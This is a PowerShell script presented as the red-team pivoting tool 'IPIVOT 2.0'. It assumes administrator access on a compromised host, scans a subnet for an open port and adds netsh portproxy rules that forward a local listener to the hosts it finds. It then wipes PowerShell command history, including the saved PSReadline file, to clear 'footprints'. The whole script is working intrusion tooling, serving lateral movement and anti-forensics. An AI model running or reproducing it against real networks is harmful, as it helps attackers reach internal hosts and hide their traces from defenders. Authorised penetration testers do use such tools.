<#
.PARAMETER ConnectingPort
Change this to the connecting port 

.PARAMETER ListeningPort
Change this to the listening port 

.PARAMETER ListeningAddress
Change this to the listening IP address you want to set the forwarding to 

.PARAMETER Network
Change this to the target network you're working on i.e 192.168.0 

.PARAMETER HostRange
Change this to determine the range or leave as default depending on your needs
#>
param (
    [int]$ConnectingPort = 9080,
    [int]$ListeningPort = 9999,
    [string]$ListeningAddress = '127.0.0.1',
    [string]$Network = '192.168.0',
    [int[]]$HostRange = 1..2
)

Write-Output "
****************************************************************************                      
              # # # # # # #
              # # # # # # #
                  # #           
                 # #            
                # #         # # # #         #   #   #  #
               # #          #      ##     #   #    #  #  # 
              # #           #       ##  #   #          #  #   
             # #            #     ##    #   #          #   #  
            # #             #   ##       #    #       #   #
           # #              ##       # #   #    #   #   #  # #   
      # # # # # #           ##         # #   # #  #  #    # #
     # # # # # #            ##           # #            # #    
                            ##             # #        # #                   
                            ##               # #    # #                       
                            ##                  ####   2.0
    
    IPIVOT 2.0 - Red Teaming Tool
    By: @fort3 - Fortune Sam Okon
        @TrimarcJake - Jake Hildreth
    Description: A little pivoting tool for when your favourite meterpreter shell fails...
    Prequisites: Identify and Gain Initial Foothold on Target as Administrator
    
    PS: If you happen to find this tool useful then I wouldn't mind a mention ;)              
 ******************************************************************************* 
 "
$ErrorActionPreference= 'silentlycontinue'

#list the network and ports found and apply the forwarding
$i = 1
foreach ($HostAddress in $HostRange) {
    $ip = "{0}.{1}" -f $network, $HostAddress
    Write-Progress "Scanning Network" $ip -PercentComplete (($i / $HostRange.Count) * 100)
    If (Test-Connection -BufferSize 32 -Count 1 -quiet -ComputerName $ip) {
        $socket = new-object System.Net.Sockets.TcpClient($ip, $ConnectingPort)
        If ($socket.Connected) {
            "$ip port $ConnectingPort is open"
            Write-Progress "Forwarding from listening ${ListeningAddress}:$ListeningPort to target\n"
            Write-Output "Forwarding from listening ${ListeningAddress}:$ListeningPort to target......."

            Write-Output "____________________________________________________________________________________________________________________________"
            
            #piece of the script that does the forwarding
            try {
                Invoke-Expression "netsh interface portproxy add v4tov4 listenaddress=$($ListeningAddress) listenport=$($ListeningPort) connectaddress=$($ip) connectport=$($ConnectingPort)"
            } catch {
                Write-Warning "Could not forward ${ListeningAddress}:$ListeningPort to target......."
            }
            Write-Progress "Checking if host is listening on port $ListeningPort and $ConnectingPort`n"
            Write-Output "Checking if host is listening on port $ListeningPort and $ConnectingPort"
            
            #verify that the port is listening
            Get-NetTCPConnection -LocalPort $ListeningPort
            Get-NetTCPConnection -LocalPort $ConnectingPort
            Write-Output "***************************************************************************************************************************"
            $socket.Close() 
        } else { 
            "$ip port $ConnectingPort is not open "
            
        }
    }
}

Write-Output "***************************************************************************************************************************"
Write-Progress "Now clearing command history and footprints from powershell saved sessions......."
Write-Output "Now clearing command history and footprints from powershell saved sessions......."

#Clears the command history, including the saved-to-file history, if applicable.
#CAUTION!!! As this is a high impact activity, you will asked to confirm this action
function Clear-SavedHistory {
    [CmdletBinding(ConfirmImpact='High', SupportsShouldProcess)]
    param(    
    )
    $havePSReadline = ($null -ne (Get-Module -EA SilentlyContinue PSReadline))
    Write-Verbose "PSReadline present: $havePSReadline"
    $target = if ($havePSReadline) 
    { 
        "entire command history, including from previous sessions" 
    } 
    else 
    { 
        "command history" 
    } 
    if (-not $pscmdlet.ShouldProcess($target))
    {
        return
    }
   
    if ($havePSReadline) 
    {
        Clear-Host

        # Remove PSReadline's saved-history file.Get-History
        if (Test-Path (Get-PSReadlineOption).HistorySavePath) 
        { 
            # Abort, if the file for some reason cannot be removed.
            Remove-Item -EA Stop (Get-PSReadlineOption).HistorySavePath

            # To be safe, we recreate the file (empty). 
            $null = New-Item -Type File -Path (Get-PSReadlineOption).HistorySavePath
        }

        # Clear PowerShell's own history
        Clear-History

        # Clear PSReadline's *session* history. 
        [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
    } 
    else
    { # Without PSReadline, we only have a *session* history.
        Clear-Host
        # Clear the doskey library's buffer, used pre-PSReadline. 
        # !! Unfortunately, this requires sending key combination Alt+F7.
        # Thanks, https://stackoverflow.com/a/13257933/45375
        $null = [system.reflection.assembly]::loadwithpartialname("System.Windows.Forms")
        [System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')
        
        # Clear PowerShell's own history 
        Clear-History
    }
}

Clear-SavedHistory